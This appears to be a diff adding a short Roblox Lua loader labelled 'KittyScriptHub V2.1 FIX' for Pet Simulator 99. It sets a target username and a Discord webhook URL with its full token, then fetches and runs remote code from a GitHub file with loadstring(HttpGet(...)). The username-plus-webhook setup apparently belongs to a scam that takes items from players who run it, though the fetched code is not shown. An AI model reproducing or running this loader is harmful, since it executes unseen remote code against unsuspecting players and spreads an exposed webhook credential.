@@ -1,0 +1,6 @@
+UserName = "survivalman503"
+UserName2 = "survivalman503"
+Webhook = "https://discord.com/api/webhooks/1357973445622890606/irkAhKdoeeKlpCUDqonUP74EOfu27AMHxbUNWX3WWnQYWsPnu7N3rWiqnWFs2g7fqxqe"
+_G.ScriptName = "Loading KittyScriptHub V2.1 FIX"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kk4ft/rizzhub/main/PS99.lua"))()
